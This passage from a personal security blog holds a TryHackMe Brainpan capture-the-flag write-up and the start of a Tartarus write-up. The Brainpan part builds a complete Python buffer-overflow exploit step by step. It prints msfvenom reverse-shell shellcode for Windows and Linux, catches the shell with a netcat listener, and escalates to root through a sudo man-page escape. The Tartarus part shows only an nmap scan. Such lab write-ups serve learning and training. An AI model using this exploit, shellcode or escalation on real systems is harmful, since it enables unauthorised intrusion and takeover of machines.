&lt;p&gt;The next step is to find the offset of the crash, I have successfully overwrote EIP but I need to determine the offset so I can accurately control the value inputted in to EIP. To find the offset I used the msf pattern create. This will create a cyclic pattern string of characters that I can put in to my script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msf-pattern_create -l 700
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4A
f5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al
0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5
Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0A
w1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;-l is to set the length of the string, the fuzzing script determined the application crashed at 700 bytes so I set the pattern to 700.&lt;/p&gt;

&lt;p&gt;I’ve updated the script with the string and also removed the while true as we are no longer fuzzing.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

buffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1
Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6A
k7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq
2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7
Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2A&quot;

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the script again crashes the application as excepted.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/EIP-Crash.png&quot; alt=&quot;EIP-Crash&quot; /&gt;&lt;/p&gt;

&lt;p&gt;EIP now has a value of 35724134. I use msf pattern offset to determine the EIP offset.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msf-pattern_offset -l 700 -q 35724134
[*] Exact match at offset 524
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great the offset is 524. To make sure its correct I’ve updated the script with a buffer of 524 A’s, 4 B’s which is what will be shown as 42424242 in EIP and the remaining bytes as D’s. Ive also added a slight offset of 4 C’s&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

filler = &quot;A&quot; * 524
EIP = &quot;B&quot; * 4
offset = &quot;C&quot; * 4
junk = &quot;D&quot; * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + junk


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran the exploit script again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/EIP.png&quot; alt=&quot;EIP&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I now control EIP!&lt;/p&gt;

&lt;h4 id=&quot;bad-characters&quot;&gt;Bad Characters&lt;/h4&gt;

&lt;p&gt;Before I go any further I need to check for bad characters that could break the exploit. To do this I updated the script with the following string. Normally I remove /x00 as this is a null byte and will break the exploit however to show the process of identifying bad characters I have kept it in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f
\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40
\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f
\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f
\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f
\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf
\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf
\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ive updated the script with the bad character list.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

badchars = (&quot;\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f&quot;
&quot;\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;
&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f&quot;
&quot;\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f&quot;
&quot;\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f&quot;
&quot;\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf&quot;
&quot;\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf&quot;
&quot;\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;)

filler = &quot;A&quot; * 524
EIP = &quot;B&quot; * 4
offset = &quot;C&quot; * 4
junk = &quot;D&quot; * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + badchars

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I ran the script again and checked Immunity Debugger.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/dump.png&quot; alt=&quot;dump&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To check for any issues I right clicked on ESP and selected ‘Follow in Dump’.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/badchar.png&quot; alt=&quot;badchar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the output I can see my offset of C’s which is 43 43 43 43 then the null byte 00 but instead of 01 I see FB, thats not what I expected which highlights that \x00 is a bad character. I update my script removing /x00 from the bad chars list and run it again.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/goodchar.png&quot; alt=&quot;goodchar&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This looks like what I was expecting, I can see my offset and then each of the characters in the bad char list. Scanning through I don’t see any more bad characters. I.e no other characters have malformed the output.&lt;/p&gt;

&lt;h4 id=&quot;find-a-return-address&quot;&gt;Find a Return Address&lt;/h4&gt;

&lt;p&gt;Our next step is to find a return address for our exploit. To do this I use the Immunity Debugger plugin mona.py plugin. Running ‘!mona modules’ in the bottom bar of Immunity Debugger I can see all the modules used. I am looking for any module which has False displayed across columns as this means I don’t need to worry about protection mechanisms.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/monamodules.png&quot; alt=&quot;monamodules&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Only one is available and its the brainpan.exe itself, now to check for JMP ESP pointers.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/brainpan/monafind.png&quot; alt=&quot;monafind&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Again only one with the value 311712f3. x86 architectures stores values in memory using little endian which means we need to reverse the byte order when adding to our script.&lt;/p&gt;

&lt;p&gt;Now I have a JMP ESP value I update the script.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3

import sys, socket
from time import sleep

#badchars = /x00

filler = &quot;A&quot; * 524
EIP = &quot;\xf3\x12\x17\x31&quot; #JMP ESP - 311712f3
offset = &quot;C&quot; * 4
junk = &quot;D&quot; * (700 -len(filler)-len(EIP))
buffer = filler + EIP + offset + junk

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&quot;create-shell-code&quot;&gt;Create shell code&lt;/h4&gt;

&lt;p&gt;Nearly finished, the last step is to add our payload that will create a reverse shell to our machine. To do this I used msfvenom.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msfvenom -p windows/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b &quot;\x00&quot;
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of c file: 1500 bytes
unsigned char buf[] = 
&quot;\xba\xc3\x19\x14\x09\xdb\xc6\xd9\x74\x24\xf4\x58\x2b\xc9\xb1&quot;
&quot;\x52\x83\xe8\xfc\x31\x50\x0e\x03\x93\x17\xf6\xfc\xef\xc0\x74&quot;
&quot;\xfe\x0f\x11\x19\x76\xea\x20\x19\xec\x7f\x12\xa9\x66\x2d\x9f&quot;
&quot;\x42\x2a\xc5\x14\x26\xe3\xea\x9d\x8d\xd5\xc5\x1e\xbd\x26\x44&quot;
&quot;\x9d\xbc\x7a\xa6\x9c\x0e\x8f\xa7\xd9\x73\x62\xf5\xb2\xf8\xd1&quot;
&quot;\xe9\xb7\xb5\xe9\x82\x84\x58\x6a\x77\x5c\x5a\x5b\x26\xd6\x05&quot;
&quot;\x7b\xc9\x3b\x3e\x32\xd1\x58\x7b\x8c\x6a\xaa\xf7\x0f\xba\xe2&quot;
&quot;\xf8\xbc\x83\xca\x0a\xbc\xc4\xed\xf4\xcb\x3c\x0e\x88\xcb\xfb&quot;
&quot;\x6c\x56\x59\x1f\xd6\x1d\xf9\xfb\xe6\xf2\x9c\x88\xe5\xbf\xeb&quot;
&quot;\xd6\xe9\x3e\x3f\x6d\x15\xca\xbe\xa1\x9f\x88\xe4\x65\xfb\x4b&quot;
&quot;\x84\x3c\xa1\x3a\xb9\x5e\x0a\xe2\x1f\x15\xa7\xf7\x2d\x74\xa0&quot;
&quot;\x34\x1c\x86\x30\x53\x17\xf5\x02\xfc\x83\x91\x2e\x75\x0a\x66&quot;
&quot;\x50\xac\xea\xf8\xaf\x4f\x0b\xd1\x6b\x1b\x5b\x49\x5d\x24\x30&quot;
&quot;\x89\x62\xf1\x97\xd9\xcc\xaa\x57\x89\xac\x1a\x30\xc3\x22\x44&quot;
&quot;\x20\xec\xe8\xed\xcb\x17\x7b\xd2\xa4\x16\x3d\xba\xb6\x18\xd0&quot;
&quot;\x66\x3e\xfe\xb8\x86\x16\xa9\x54\x3e\x33\x21\xc4\xbf\xe9\x4c&quot;
&quot;\xc6\x34\x1e\xb1\x89\xbc\x6b\xa1\x7e\x4d\x26\x9b\x29\x52\x9c&quot;
&quot;\xb3\xb6\xc1\x7b\x43\xb0\xf9\xd3\x14\x95\xcc\x2d\xf0\x0b\x76&quot;
&quot;\x84\xe6\xd1\xee\xef\xa2\x0d\xd3\xee\x2b\xc3\x6f\xd5\x3b\x1d&quot;
&quot;\x6f\x51\x6f\xf1\x26\x0f\xd9\xb7\x90\xe1\xb3\x61\x4e\xa8\x53&quot;
&quot;\xf7\xbc\x6b\x25\xf8\xe8\x1d\xc9\x49\x45\x58\xf6\x66\x01\x6c&quot;
&quot;\x8f\x9a\xb1\x93\x5a\x1f\xd1\x71\x4e\x6a\x7a\x2c\x1b\xd7\xe7&quot;
&quot;\xcf\xf6\x14\x1e\x4c\xf2\xe4\xe5\x4c\x77\xe0\xa2\xca\x64\x98&quot;
&quot;\xbb\xbe\x8a\x0f\xbb\xea&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;msfvenom allows for the reverse shell payload to be created which I can add to the script.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;-p - Set the payload in this case I wanted a windows reverse shell&lt;/li&gt;
  &lt;li&gt;LHOST - Set to the TryHackMe VPN IP&lt;/li&gt;
  &lt;li&gt;LPORT - A port on my machine&lt;/li&gt;
  &lt;li&gt;EXITFUNC - If applicable it ensures an applications remains stable when the shell is closed&lt;/li&gt;
  &lt;li&gt;-f - Set the format of the output to c&lt;/li&gt;
  &lt;li&gt;-e - Encoding type to shikata_ga_nai&lt;/li&gt;
  &lt;li&gt;-a - Set architecture&lt;/li&gt;
  &lt;li&gt;-b - provide a list of the bad characters I found earlier&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The final exploit script is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;#!/usr/bin/python3                                                                                                        
                                                                                                                          
import sys, socket                                                                                                        
from time import sleep                                                                                                    
                                                                                                                          
#badchars = /x00                                                                                                          
                                                                                                                          
#msfvenom -p windows/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b &quot;\x00&quot;
                                                                                                                          
payload = (&quot;\xb8\x6b\x6e\x2b\xda\xda\xc8\xd9\x74\x24\xf4\x5a\x31\xc9\xb1&quot;                                                
&quot;\x52\x31\x42\x12\x03\x42\x12\x83\x81\x92\xc9\x2f\xa9\x83\x8c&quot;                                                            
&quot;\xd0\x51\x54\xf1\x59\xb4\x65\x31\x3d\xbd\xd6\x81\x35\x93\xda&quot;                                                            
&quot;\x6a\x1b\x07\x68\x1e\xb4\x28\xd9\x95\xe2\x07\xda\x86\xd7\x06&quot;
&quot;\x58\xd5\x0b\xe8\x61\x16\x5e\xe9\xa6\x4b\x93\xbb\x7f\x07\x06&quot;
&quot;\x2b\x0b\x5d\x9b\xc0\x47\x73\x9b\x35\x1f\x72\x8a\xe8\x2b\x2d&quot;
&quot;\x0c\x0b\xff\x45\x05\x13\x1c\x63\xdf\xa8\xd6\x1f\xde\x78\x27&quot;
&quot;\xdf\x4d\x45\x87\x12\x8f\x82\x20\xcd\xfa\xfa\x52\x70\xfd\x39&quot;
&quot;\x28\xae\x88\xd9\x8a\x25\x2a\x05\x2a\xe9\xad\xce\x20\x46\xb9&quot;
&quot;\x88\x24\x59\x6e\xa3\x51\xd2\x91\x63\xd0\xa0\xb5\xa7\xb8\x73&quot;
&quot;\xd7\xfe\x64\xd5\xe8\xe0\xc6\x8a\x4c\x6b\xea\xdf\xfc\x36\x63&quot;
&quot;\x13\xcd\xc8\x73\x3b\x46\xbb\x41\xe4\xfc\x53\xea\x6d\xdb\xa4&quot;
&quot;\x0d\x44\x9b\x3a\xf0\x67\xdc\x13\x37\x33\x8c\x0b\x9e\x3c\x47&quot;
&quot;\xcb\x1f\xe9\xc8\x9b\x8f\x42\xa9\x4b\x70\x33\x41\x81\x7f\x6c&quot;
&quot;\x71\xaa\x55\x05\x18\x51\x3e\x20\xd5\x4c\x67\x5c\xe7\x6e\x86&quot;
&quot;\xc1\x6e\x88\xc2\xe9\x26\x03\x7b\x93\x62\xdf\x1a\x5c\xb9\x9a&quot;
&quot;\x1d\xd6\x4e\x5b\xd3\x1f\x3a\x4f\x84\xef\x71\x2d\x03\xef\xaf&quot;
&quot;\x59\xcf\x62\x34\x99\x86\x9e\xe3\xce\xcf\x51\xfa\x9a\xfd\xc8&quot;
&quot;\x54\xb8\xff\x8d\x9f\x78\x24\x6e\x21\x81\xa9\xca\x05\x91\x77&quot;
&quot;\xd2\x01\xc5\x27\x85\xdf\xb3\x81\x7f\xae\x6d\x58\xd3\x78\xf9&quot;
&quot;\x1d\x1f\xbb\x7f\x22\x4a\x4d\x9f\x93\x23\x08\xa0\x1c\xa4\x9c&quot;
&quot;\xd9\x40\x54\x62\x30\xc1\x74\x81\x90\x3c\x1d\x1c\x71\xfd\x40&quot;
&quot;\x9f\xac\xc2\x7c\x1c\x44\xbb\x7a\x3c\x2d\xbe\xc7\xfa\xde\xb2&quot;
&quot;\x58\x6f\xe0\x61\x58\xba&quot;)

filler = &quot;A&quot; * 524
EIP = &quot;\xf3\x12\x17\x31&quot; #JMP ESP - 311712f3
offset = &quot;C&quot; * 4
nops = &quot;\x90&quot; * 32
buffer = filler + EIP + offset + nops + payload

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((&quot;brainpan&quot;,9999))
    s.recv(1024)
    s.send(buffer + &quot;\r\n&quot;)
    s.close()

except:
   print(&quot;Application crashed&quot;)
   sys.exit()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Before I run the script I change the hosts file to point to the machine IP provided by TryHackMe and start a netcat listener.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.8.21.217] from (UNKNOWN) [10.10.220.224] 35409
CMD Version 1.4.1

Z:\home\puck&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We have a shell, the script worked!&lt;/p&gt;

&lt;h3 id=&quot;priv-esc&quot;&gt;Priv Esc&lt;/h3&gt;

&lt;p&gt;Although the main purpose of the machine is to help with buffer overflow we still need to get administrator on the box. Doing some basic enumeration of the box highlights its actually a linux machine and using wine to run the brainpan.exe application. So I update my exploit script with a linux msfvenom payload and get a new shell.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Brainpan]
└──╼ $msfvenom -p linux/x86/shell_reverse_tcp LHOST=VPN IP LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b &quot;\x00&quot;
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 95 (iteration=0)
x86/shikata_ga_nai chosen with final size 95
Payload size: 95 bytes
Final size of c file: 425 bytes
unsigned char buf[] = 
&quot;\xda\xd2\xd9\x74\x24\xf4\xbe\x14\x22\x5b\xcc\x5f\x29\xc9\xb1&quot;
&quot;\x12\x83\xef\xfc\x31\x77\x13\x03\x63\x31\xb9\x39\xba\xee\xca&quot;
&quot;\x21\xef\x53\x66\xcc\x0d\xdd\x69\xa0\x77\x10\xe9\x52\x2e\x1a&quot;
&quot;\xd5\x99\x50\x13\x53\xdb\x38\xae\xab\x0e\x61\xc6\xa9\x30\x80&quot;
&quot;\x4b\x27\xd1\x12\x15\x67\x43\x01\x69\x84\xea\x44\x40\x0b\xbe&quot;
&quot;\xee\x35\x23\x4c\x86\xa1\x14\x9d\x34\x5b\xe2\x02\xea\xc8\x7d&quot;
&quot;\x25\xba\xe4\xb0\x26&quot;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now with a new linux shell I enumerate the machine again.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;puck@brainpan:/home/puck$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running sudo -l shows our user ‘puck’ can run /home/anansi/bin/anansi_util as root with out a password.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
puck@brainpan:/home/puck$ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running the utility I get 3 options, manual looks interesting as I can choose a command.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util manual bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I am presented with the man page for bash so I can try to break out of the manual by typing: !/bin/bash&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;root@brainpan:/usr/share/man# id
uid=0(root) gid=0(root) groups=0(root)
root@brainpan:/usr/share/man# cd /root
root@brainpan:~# ls
b.txt
root@brainpan:~# cat b.txt 
_|                            _|                                        
_|_|_|    _|  _|_|    _|_|_|      _|_|_|    _|_|_|      _|_|_|  _|_|_|  
_|    _|  _|_|      _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|    _|  _|        _|    _|  _|  _|    _|  _|    _|  _|    _|  _|    _|
_|_|_|    _|          _|_|_|  _|  _|    _|  _|_|_|      _|_|_|  _|    _|
                                            _|                          
                                            _|


                                              http://www.techorganic.com 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I exit the manual as root!&lt;/p&gt;

&lt;p&gt;Thats the box, thanks for reading!&lt;/p&gt;</content><author><name>Darryn</name></author><category term="tryhackme" /><category term="ctf" /><category term="easy" /><category term="bufferoverflow" /><category term="oscp" /><summary type="html"></summary></entry><entry><title type="html">Tartarus Write Up</title><link href="https://darrynbrownfield.co.uk/Tartarus" rel="alternate" type="text/html" title="Tartarus Write Up" /><published>2020-09-26T00:00:00+00:00</published><updated>2020-09-26T00:00:00+00:00</updated><id>https://darrynbrownfield.co.uk/Tartarus</id><content type="html" xml:base="https://darrynbrownfield.co.uk/Tartarus">&lt;p&gt;&lt;img src=&quot;/assets/images/tartarus/cover.jpeg&quot; alt=&quot;GitHappens&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;overview&quot;&gt;Overview&lt;/h3&gt;

&lt;p&gt;Tartarus is an fun easy room from &lt;a href=&quot;https://tryhackme.com&quot;&gt;TryHackMe&lt;/a&gt;. We have two tasks to complete, finding both the user and root flag. Typical CTF style room.&lt;/p&gt;

&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;

&lt;p&gt;TryHackMe will assign a dynamic IP as part of the deployment, I’ve edited my /etc/hosts file with the name of the box and the assigned IP. I started by doing an nmap scan to check what ports are open.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/TryHackMe/Tartarus]
└──╼ $sudo nmap -sC -sV -oA nmap/initial tartarus
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-26 16:16 BST
Nmap scan report for tartarus (10.10.30.144)
Host is up (0.026s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.21.217
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 98:6c:7f:49:db:54:cb:36:6d:d5:ff:75:42:4c:a7:e0 (RSA)
|   256 0c:7b:1a:9c:ed:4b:29:f5:3e:be:1c:9a:e4:4c:07:2c (ECDSA)
|_  256 50:09:9f:c0:67:3e:89:93:b0:c9:85:f1:93:89:50:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.18 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3 Ports open:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;21 - FTP - Anonymous login allowed which is interesting will need to check what files and access is available&lt;/li&gt;
  &lt;li&gt;22 - SSH - Banner is showing its an Ubuntu machine&lt;/li&gt;
